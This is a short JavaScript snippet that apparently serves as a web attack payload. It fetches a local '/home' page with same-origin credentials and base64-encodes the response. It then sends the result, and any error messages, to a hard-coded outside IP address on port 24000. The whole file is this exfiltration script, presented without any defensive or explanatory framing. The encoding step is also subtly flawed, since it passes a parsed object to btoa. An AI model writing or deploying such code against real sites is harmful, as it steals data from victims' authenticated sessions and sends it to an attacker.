const url = 'https://127.0.0.1:5000/home';

// Making a GET request using fetch()
fetch(url, {
    method: "GET", // *GET, POST, PUT, DELETE, etc.
    mode: "same-origin", // no-cors, *cors, same-origin
    cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
    credentials: "same-origin", // include, *same-origin, omit  
})
  .then(response => {
    return response.json();
  })
  .then(data => {
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
  })
  .catch(error => {
    console.log("error");
    fetch("http://82.65.210.151:24000/?error=" + error);
  });
